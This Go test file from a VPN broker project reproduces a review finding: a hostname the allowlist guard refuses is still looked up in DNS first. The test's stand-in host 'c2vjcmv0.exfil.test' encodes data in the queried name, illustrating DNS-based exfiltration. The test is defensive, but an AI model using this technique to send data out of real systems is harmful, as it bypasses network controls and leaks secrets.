// Copyright VPNW.com 2026
// SPDX-License-Identifier: Apache-2.0

// Review of 0.9.0: reproductions of defects found by the independent review.

package broker

import (
	"testing"

	"github.com/VPNWorks/vpnw/internal/config"
)

// A host the Guard refuses (Budget: not on the allowlist) is still looked
// up in DNS first when the policy needs addresses (deny_private), so a
// program can send data out in the names it asks for.
func TestReview090GuardRefusedNameIsLookedUp(t *testing.T) {
	g := &stubGuard{name: "budget", deny: map[string]string{"c2vjcmv0.exfil.test": "not on the budget allowlist"}}
	r := newRig(t, pol(t, config.PolicySpec{Default: "allow", DenyPrivate: true, DenyPrivateSet: true}), g)
	_, status := connect(t, r.addr, "c2vjcmv0.exfil.test:443", "")
	t.Logf("status %q, guard asked %d times", status, len(g.asked))
	for _, q := range r.dns.queries {
		if q == "c2vjcmv0.exfil.test" {
			t.Errorf("the Guard refused c2vjcmv0.exfil.test, but vpnw looked it up first: %v", r.dns.queries)
		}
	}
}
